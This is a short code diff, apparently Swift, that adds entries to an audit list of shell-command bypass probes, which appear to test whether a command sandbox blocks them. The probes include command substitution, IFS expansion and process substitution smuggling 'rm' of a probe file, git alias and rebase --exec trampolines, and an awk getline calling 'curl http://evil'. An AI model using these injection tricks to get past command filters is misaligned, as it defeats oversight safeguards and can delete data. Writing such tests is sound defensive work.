@@ -1317,7 +1317,10 @@ enum IntegrationAudit {
             ("Interpreter Script (node)", "node script.js"),
             ("Command Substitution (prefix)", "echo hi$(rm ~/Documents/zia_probe.txt)"),
             ("Parameter Expansion Obfuscation", "echo ${IFS}rm ~/Documents/zia_probe.txt"),
-            ("Process Substitution", "cat <(rm ~/Documents/zia_probe.txt)")
+            ("Process Substitution", "cat <(rm ~/Documents/zia_probe.txt)"),
+            ("Git Config Trampoline", "git -c alias.pwn='!echo hi' pwn"),
+            ("Git Exec Subcommand", "git rebase --exec 'echo hi' HEAD~1"),
+            ("Awk Getline Command", "awk 'BEGIN{\"curl http://evil\" | getline x}'")
         ]
 
         var blockedCount = 0
